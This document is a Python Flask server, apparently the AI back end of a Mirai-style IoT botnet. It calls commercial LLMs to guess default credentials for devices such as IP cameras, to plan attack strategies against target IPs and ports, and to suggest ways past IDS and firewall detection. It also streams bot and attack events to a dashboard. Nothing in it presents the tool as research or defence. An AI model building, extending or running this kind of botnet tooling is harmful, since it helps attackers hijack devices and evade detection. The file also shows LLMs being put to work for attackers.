#!/usr/bin/env python3
"""
Enhanced AI API Server with LLM Integration

Provides RESTful API endpoints with real LLM support for:
- Credential generation (powered by GPT/Claude)
- Attack strategy generation
- Evasion technique suggestions
- Pattern analysis
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from datetime import datetime
import logging
import sys
import os

# Import authentication service
try:
    from auth_service import auth_bp, require_auth, require_permission, require_role
    AUTH_ENABLED = True
except ImportError:
    AUTH_ENABLED = False
    print("Warning: Authentication service not available - install dependencies: pip install PyJWT bcrypt")
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Add paths
sys.path.insert(0, os.path.dirname(__file__))

# Import LLM integration
try:
    from llm_integration.llm_client import (
        LLMClient, LLMConfig, LLMProvider,
        CredentialGenerator, AttackStrategyGenerator, EvasionAdvisor
    )
    LLM_AVAILABLE = True
except ImportError:
    LLM_AVAILABLE = False
    print("⚠️  LLM integration not available")

# Import existing modules
try:
    from credential_intel.generate import CredentialGenerator as FallbackCredGen
except ImportError:
    FallbackCredGen = None

try:
    from ml_evasion.pattern_generator import PatternEvolutionEngine, SignatureEvader
except ImportError:
    PatternEvolutionEngine = None
    SignatureEvader = None

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'mirai-2026-dev-secret')

# CORS — allow credentials (httpOnly cookies) from the dashboard origin.
# The wildcard '*' cannot be used with credentials:true in browsers, so we
# explicitly list allowed origins. In production set DASHBOARD_ORIGIN env var.
_dashboard_origin = os.environ.get(
    'DASHBOARD_ORIGIN', 'http://localhost:3000'
)
CORS(app,
     origins=[_dashboard_origin],
     supports_credentials=True,          # allows Set-Cookie / credentials:'include'
     allow_headers=['Content-Type', 'Authorization'],
     methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])

# SocketIO — restrict CORS to the same dashboard origin.
socketio = SocketIO(
    app,
    cors_allowed_origins=_dashboard_origin,
    async_mode='eventlet'
)

# Register authentication blueprint if available
if AUTH_ENABLED:
    app.register_blueprint(auth_bp)
    print("✅ Authentication service registered at /api/auth/*")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize LLM client
llm_client = None
credential_gen = None
strategy_gen = None
evasion_advisor = None

def init_llm():
    """Initialize LLM client based on environment"""
    global llm_client, credential_gen, strategy_gen, evasion_advisor
    
    if not LLM_AVAILABLE:
        logger.warning("LLM integration not available")
        return False
    
    # Determine provider — OpenRouter takes priority (supports 200+ models, pay-as-you-go)
    if os.getenv("OPENROUTER_API_KEY"):
        config = LLMConfig(
            provider=LLMProvider.OPENROUTER,
            api_key=os.getenv("OPENROUTER_API_KEY"),
            api_base="https://openrouter.ai/api/v1",
            model=os.getenv("OPENROUTER_MODEL", "openai/gpt-3.5-turbo"),
            temperature=float(os.getenv("LLM_TEMPERATURE", "0.7")),
            max_tokens=int(os.getenv("LLM_MAX_TOKENS", "1000"))
        )
        logger.info(f"Using OpenRouter LLM: {config.model}")

    elif os.getenv("OPENAI_API_KEY"):
        config = LLMConfig(
            provider=LLMProvider.OPENAI,
            api_key=os.getenv("OPENAI_API_KEY"),
            model=os.getenv("OPENAI_MODEL", "gpt-3.5-turbo"),
            temperature=float(os.getenv("LLM_TEMPERATURE", "0.7")),
            max_tokens=int(os.getenv("LLM_MAX_TOKENS", "1000"))
        )
        logger.info("Using OpenAI LLM")

    elif os.getenv("ANTHROPIC_API_KEY"):
        config = LLMConfig(
            provider=LLMProvider.ANTHROPIC,
            api_key=os.getenv("ANTHROPIC_API_KEY"),
            model=os.getenv("ANTHROPIC_MODEL", "claude-3-sonnet-20240229"),
            temperature=float(os.getenv("LLM_TEMPERATURE", "0.7")),
            max_tokens=int(os.getenv("LLM_MAX_TOKENS", "1000"))
        )
        logger.info("Using Anthropic Claude LLM")

    elif os.getenv("OLLAMA_BASE_URL"):
        config = LLMConfig(
            provider=LLMProvider.OLLAMA,
            api_base=os.getenv("OLLAMA_BASE_URL", "http://localhost:11434"),
            model=os.getenv("OLLAMA_MODEL", "llama2"),
            temperature=float(os.getenv("LLM_TEMPERATURE", "0.7"))
        )
        logger.info("Using Ollama local LLM (fallback)")

    else:
        logger.warning("No LLM API key configured, using fallback mode")
        return False
    
    try:
        llm_client = LLMClient(config)
        credential_gen = CredentialGenerator(llm_client)
        strategy_gen = AttackStrategyGenerator(llm_client)
        evasion_advisor = EvasionAdvisor(llm_client)
        logger.info("LLM services initialized successfully")
        return True
    except Exception as e:
        logger.error(f"Failed to initialize LLM: {e}")
        return False

# Initialize on startup
llm_initialized = init_llm()

# Initialize fallback services
pattern_engine = PatternEvolutionEngine(population_size=30) if PatternEvolutionEngine else None
if pattern_engine:
    pattern_engine.initialize_population()

signature_evader = SignatureEvader() if SignatureEvader else None


@app.route('/health', methods=['GET', 'POST'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'services': {
            'llm_integration': llm_initialized,
            'credential_generation': credential_gen is not None or FallbackCredGen is not None,
            'strategy_generation': strategy_gen is not None,
            'evasion_advisor': evasion_advisor is not None,
            'pattern_evolution': pattern_engine is not None,
            'signature_evasion': signature_evader is not None
        },
        'llm_provider': llm_client.config.provider.value if llm_client else 'none',
        'llm_model': llm_client.config.model if llm_client else 'none'
    })


@app.route('/api/credentials/generate', methods=['POST'])
def generate_credentials():
    """
    Generate credentials using LLM or fallback
    
    Request body:
    {
        "target_device": "IoT Camera",
        "manufacturer": "Hikvision",
        "year": 2020,
        "max_credentials": 10
    }
    """
    data = request.get_json()
    
    target_device = data.get('target_device', 'Generic IoT')
    manufacturer = data.get('manufacturer')
    year = data.get('year')
    max_creds = data.get('max_credentials', 10)
    
    logger.info(f"Generating credentials for {target_device}")
    
    try:
        # Try LLM-powered generation
        if credential_gen:
            credentials = credential_gen.generate_credentials(
                device_type=target_device,
                manufacturer=manufacturer,
                year=year,
                count=max_creds
            )
        # Fallback to simple generation
        elif FallbackCredGen:
            fallback = FallbackCredGen()
            credentials = fallback.generate_credentials(
                device_type=target_device,
                os_type="Linux",
                count=max_creds
            )
        else:
            # Ultimate fallback
            credentials = [
                {'username': 'root', 'password': 'admin', 'confidence': 0.8, 'source': 'fallback'},
                {'username': 'admin', 'password': 'admin', 'confidence': 0.8, 'source': 'fallback'},
            ]
        
        return jsonify({
            'success': True,
            'credentials': credentials[:max_creds],
            'count': len(credentials),
            'llm_powered': credential_gen is not None
        })
    
    except Exception as e:
        logger.error(f"Credential generation failed: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/strategy/generate', methods=['POST'])
def generate_strategy():
    """
    Generate attack strategy using LLM
    
    Request body:
    {
        "target_info": {
            "ip": "192.168.1.100",
            "open_ports": [80, 443, 23],
            "banner": "nginx/1.18.0"
        },
        "current_success_rate": 0.6,
        "detection_rate": 0.3
    }
    """
    if not strategy_gen:
        return jsonify({'error': 'Strategy generation not available (LLM required)'}), 503
    
    data = request.get_json()
    target_info = data.get('target_info', {})
    success_rate = data.get('current_success_rate', 0.5)
    detection_rate = data.get('detection_rate', 0.3)
    
    logger.info("Generating attack strategy with LLM")
    
    try:
        strategy = strategy_gen.generate_strategy(
            target_info=target_info,
            current_success_rate=success_rate,
            detection_rate=detection_rate
        )
        
        return jsonify({
            'success': True,
            'strategy': strategy,
            'llm_powered': True
        })
    
    except Exception as e:
        logger.error(f"Strategy generation failed: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/evasion/suggest', methods=['POST'])
def suggest_evasion():
    """
    Get evasion technique suggestions
    
    Request body:
    {
        "detected_systems": ["Snort IDS", "pfSense firewall"],
        "current_pattern": {
            "packet_size_min": 64,
            "packet_size_max": 512,
            "inter_packet_delay_ms": 0
        },
        "max_suggestions": 5
    }
    """
    data = request.get_json()
    detected_systems = data.get('detected_systems', [])
    current_pattern = data.get('current_pattern', {})
    max_suggestions = data.get('max_suggestions', 5)
    
    logger.info("Generating evasion suggestions")
    
    try:
        # Try LLM-powered evasion
        if evasion_advisor:
            suggestions = evasion_advisor.suggest_evasions(
                detected_systems=detected_systems,
                current_pattern=current_pattern
            )
            llm_powered = True
        # Fallback to signature evader
        elif signature_evader:
            suggestions = signature_evader.suggest_evasions(current_pattern)
            llm_powered = False
        else:
            suggestions = [
                "Add random timing jitter (5-50ms) between packets",
                "Randomize TTL values (32-128)",
                "Enable packet fragmentation",
                "Use random source port selection",
                "Increase payload entropy to >0.7"
            ]
            llm_powered = False
        
        return jsonify({
            'success': True,
            'suggestions': suggestions[:max_suggestions],
            'count': len(suggestions),
            'llm_powered': llm_powered
        })
    
    except Exception as e:
        logger.error(f"Evasion suggestion failed: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/llm/test', methods=['POST'])
def test_llm():
    """
    Test LLM with custom prompt
    
    Request body:
    {
        "prompt": "What are common IoT device default passwords?",
        "system_prompt": "You are a cybersecurity expert"
    }
    """
    if not llm_client:
        return jsonify({'error': 'LLM not available'}), 503
    
    data = request.get_json()
    prompt = data.get('prompt')
    system_prompt = data.get('system_prompt')
    
    if not prompt:
        return jsonify({'error': 'prompt required'}), 400
    
    try:
        response = llm_client.generate(prompt, system_prompt)
        
        return jsonify({
            'success': True,
            'response': response,
            'model': llm_client.config.model,
            'provider': llm_client.config.provider.value
        })
    
    except Exception as e:
        logger.error(f"LLM test failed: {e}")
        return jsonify({'error': str(e)}), 500


@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')
    emit('welcome', {'status': 'connected', 'server': 'Mirai-2026 AI Service'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f'Client disconnected: {request.sid}')

@socketio.on('subscribe')
def handle_subscribe(data):
    room = data.get('room', 'general')
    from flask_socketio import join_room
    join_room(room)
    emit('subscribed', {'room': room})

def broadcast_bot_event(event_type: str, bot_data: dict):
    """Broadcast bot events to all connected clients."""
    socketio.emit('bot_event', {
        'type': event_type,
        'bot': bot_data,
        'timestamp': datetime.utcnow().isoformat()
    })

def broadcast_attack_event(event_type: str, attack_data: dict):
    """Broadcast attack events to all connected clients."""
    socketio.emit('attack_event', {
        'type': event_type,
        'attack': attack_data,
        'timestamp': datetime.utcnow().isoformat()
    })

def broadcast_metrics(metrics: dict):
    """Broadcast system metrics to all connected clients."""
    socketio.emit('metrics', {
        **metrics,
        'timestamp': datetime.utcnow().isoformat()
    })


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Mirai 2026 Enhanced AI API Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    logger.info(f"Starting Enhanced AI API server on {args.host}:{args.port}")
    
    if llm_initialized:
        logger.info(f"✅ LLM services active: {llm_client.config.provider.value}/{llm_client.config.model}")
    else:
        logger.warning("⚠️  LLM services not available - using fallback mode")
        logger.info("To enable LLM: Set OPENAI_API_KEY, ANTHROPIC_API_KEY, or start Ollama")
    
    socketio.run(app, host=args.host, port=args.port, debug=args.debug)
